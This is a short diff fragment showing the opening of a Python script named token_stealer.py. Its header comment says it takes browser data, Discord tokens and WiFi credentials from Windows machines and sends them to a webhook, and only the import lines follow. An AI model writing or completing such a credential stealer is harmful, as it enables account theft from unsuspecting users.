@@ -1,4 +1,4 @@
-cat > ~/token_stealer.py << 'EOF'
+
 # token_stealer.py — Windows: browsers + Discord (app & web) + WiFi -> webhook
 import os, sys, json, base64, sqlite3, shutil, subprocess, zipfile, tempfile, re, time
 import requests
